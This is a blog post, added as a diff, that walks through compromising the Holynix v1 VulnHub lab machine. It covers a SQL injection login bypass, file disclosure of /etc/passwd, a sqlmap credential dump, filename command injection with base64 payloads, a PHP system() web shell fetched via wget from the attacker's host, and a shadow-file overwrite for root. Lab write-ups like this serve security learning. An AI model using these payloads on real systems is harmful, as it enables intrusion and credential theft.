@@ -1,0 +1,226 @@
+---
+layout: post
+title: "Holynix: v1"
+date: 2015-05-10 13:54:06 +0200
+comments: true
+categories: [vulnhub, holynix]
+---
+Image: [Holynix: v1](https://www.vulnhub.com/entry/holynix-v1,20/)
+
+We set networking in Vmware Fusion as "Share with my Mac" and check the 
+obtained IP address:
+
+{% codeblock %}
+/var/db/vmware:
+lease 192.168.80.142 {
+        starts 4 2015/04/30 16:18:54;
+        ends 4 2015/04/30 16:48:54;
+        hardware ethernet 00:0c:29:bc:05:de;
+}
+{% endcodeblock %}
+
+Nmap output:
+{% codeblock %}
+root@kali32:~# nmap -sV -p- 192.168.80.142
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-27 07:16 CEST
+Nmap scan report for 192.168.80.142
+Host is up (0.00028s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
+MAC Address: 00:0C:29:BC:05:DE (VMware)
+{% endcodeblock %}
+
+There is a SQL injection in the web login, we submit the following username and password: 
+{% codeblock %}
+test' or '1'='1
+{% endcodeblock %}
+
+Via security (ssp.php) we can disclose arbitrary file (for example /etc/passwd):
+{% codeblock %}
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:105:114:MySQL Server,,,:/var/lib/mysql:/bin/false
+alamo:x:1000:115::/home/alamo:/bin/bash
+etenenbaum:x:1001:100::/home/etenenbaum:/bin/bash
+gmckinnon:x:1002:100::/home/gmckinnon:/bin/bash
+hreiser:x:1003:50::/home/hreiser:/bin/bash
+jdraper:x:1004:100::/home/jdraper:/bin/bash
+jjames:x:1005:50::/home/jjames:/bin/bash
+jljohansen:x:1006:115::/home/jljohansen:/bin/bash
+ltorvalds:x:1007:113::/home/ltorvalds:/bin/bash
+kpoulsen:x:1008:100::/home/kpoulsen:/bin/bash
+mrbutler:x:1009:50::/home/mrbutler:/bin/bash
+rtmorris:x:1010:100::/home/rtmorris:/bin/bash
+{% endcodeblock %}
+
+With sqlmap we can dump the whole database (%40 means '@' character):
+{% codeblock %}
+# sqlmap -u "http://192.168.80.142/index.php?page=login.php&user_name=a&password=a&Submit_button=Submit" --dump-all
+{% endcodeblock %}
+{% codeblock %}
+root@kali32:~/.sqlmap/output/192.168.80.142/dump# cat creds/accounts.csv
+cid,upload,username,password
+1,0,alamo,Ih%40cK3dM1cR05oF7
+2,1,etenenbaum,P3n7%40g0n0wN3d
+3,1,gmckinnon,d15cL0suR3Pr0J3c7
+4,1,hreiser,Ik1Ll3dNiN%40r315er
+5,1,jdraper,p1%40yIngW17hPh0n35
+6,1,jjames,%40rR35t3D%40716
+7,1,jljohansen,m%40k1nGb0o7L3g5
+8,1,kpoulsen,wH%407ar37H3Fed5D01n
+9,0,ltorvalds,f%407H3r0FL1nUX
+10,1,mrbutler,n%405aHaSw0rM5
+11,1,rtmorris,Myd%40d51N7h3NSA
+{% endcodeblock %}
+
+Using sqlmap --passwords parameter we got:
+{% codeblock %}
+database management system users password hashes:
+[*] debian-sys-maint [1]:
+    password hash: %2A04DDBBF6BA7B43D9B78611E125C80124644D17B8
+[*] root [1]:
+    password hash: %2AA69F92BBDEA591F5BB9E4A049F0C181D6DB5177E
+{% endcodeblock %}
+
+Back to the web page, there is a cookie set as 'uid=1'. We can try different
+numbers, because not every user has allowed to upload file, see accounts.csv. 
+
+We disclose transfer.php script:
+{% codeblock lang:php %}
+if ( $auth == 0 ) {
+        echo "<center><h2>Content Restricted</h2></center>";
+} else {
+        if ( $upload == 1 )
+        {
+                $homedir = "/home/".$logged_in_user. "/";
+                $uploaddir = "upload/";
+                $target = $uploaddir . basename( $_FILES['uploaded']['name']) ;
+                $uploaded_type = $_FILES['uploaded']['type'];
+                $command=0;
+                $ok=1;
+
+                if ( $uploaded_type =="application/gzip" && $_POST['autoextract'] == 'true' ) { $command = 1; }
+
+                if ($ok==0)
+                {
+                        echo "Sorry your file was not uploaded";
+                        echo "<a href='?index.php?page=upload.php' >Back to upload page</a>";
+                } else {
+                        if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $target))
+                        {
+                                echo "<h3>The file '" .$_FILES['uploaded']['name']. "' has been uploaded.</h4><br />";
+                                echo "The ownership of the uploaded file(s) have been changed accordingly.";
+                                echo "<br /><a href='?page=upload.php' >Back to upload page</a>";
+                                if ( $command == 1 )
+                                {
+                                        exec("sudo tar xzf " .$target. " -C " .$homedir);
+                                        exec("rm " .$target);
+                                } else {
+                                        exec("sudo mv " .$target. " " .$homedir . $_FILES['uploaded']['name']);
+                                }
+                                exec("/var/apache2/htdocs/update_own");
+                        } else {
+                                echo "Sorry, there was a problem uploading your file.<br />";
+                                echo "<br /><a href='?page=upload.php' >Back to upload page</a>";
+                        }
+                }
+        } else { echo "<br /><br /><h3>Home directory uploading disabled for user " .$logged_in_user. "</h3>"; }
+}
+?>
+{% endcodeblock %}
+
+As we can see from the source code, the filename is used in shell command and
+we can inject malicious input. However the '/' or '\' characters are
+prohibited, because to $target is stored only the value after (back)slash.
+
+Locator (it never terminates, but confirms our finding):
+{% codeblock %}
+Content-Disposition: form-data; name="uploaded"; filename=";yes;"
+{% endcodeblock %}
+
+We can evade the slash restriction encoding the payload as base64 (touch /tmp/owned):
+{% codeblock %}
+Content-Disposition: form-data; name="uploaded"; filename=";`echo dG91Y2ggL3RtcC9vd25lZA==| base64 -d`;"
+{% endcodeblock %}
+
+There could be a problem with a bigger input ("filename too long").
+
+Similarly we upload the following base64 payload:
+{% codeblock %}
+root@kali32:/var/www# echo '<?php system($_REQUEST['cmd']); ?>' | base64
+PD9waHAgc3lzdGVtKCRfUkVRVUVTVFtjbWRdKTsgPz4K
+{% endcodeblock %}
+
+We try our php shell and in the case of success, we upload weevely from our web server:
+{% codeblock %}
+http://192.168.80.142/b.php?cmd=id
+http://192.168.80.142/b.php?cmd=wget 192.168.80.137/weevely.php.txt -O c.php
+{% endcodeblock %}
+
+{% codeblock %}
+root@kali32:/var/www# weevely http://192.168.80.142/c.php 1234
+{% endcodeblock %}
+
+Note that there exists also a trivial solution, because users can upload php
+shell to home directory, which can be invoked without any restriction.
+
+If we read the discussion on web server, someone is asking about port knocking.
+We download the data to our server: 
+{% codeblock %}
+www-data@:/etc/knockknock.d/profiles/alamo $
+
+root@kali32:~# find .knockknock/
+.knockknock/
+.knockknock/192.168.80.142
+.knockknock/192.168.80.142/config
+.knockknock/192.168.80.142/counter
+.knockknock/192.168.80.142/mac.key
+.knockknock/192.168.80.142/cipher.key
+{% endcodeblock %}
+
+From the vulnerable server, we download and use knockknock too:
+{% codeblock %}
+root@kali32:~/.knockknock# knockknock -p 22 192.168.80.142
+*** Success: knock sent.
+root@kali32:~/.knockknock# ssh alamo@192.168.80.142
+
+The authenticity of host '192.168.80.142 (192.168.80.142)' can't be established.
+RSA key fingerprint is 03:73:de:c7:17:96:0b:bb:8c:8e:c7:87:9b:5b:d5:c9.
+Are you sure you want to continue connecting (yes/no)?
+{% endcodeblock %}
+
+We log in as alamo / Ih@cK3dM1cR05oF7.
+
+Because nobody has higher privileges for sudo except www-data, we use the web
+account to obtain root privileges.
+One way of doing this is to change using chown /etc/shadow the file permissions
+to www-data, move to /tmp and change the root hash to a know one (e.g.
+alamo's). Then we move the shadow file back. 
+
+In the end we log in as root with Ih@cK3dM1cR05oF7 password:
+{% codeblock %}
+# uid=0(root) gid=0(root) groups=0(root)
+{% endcodeblock %}
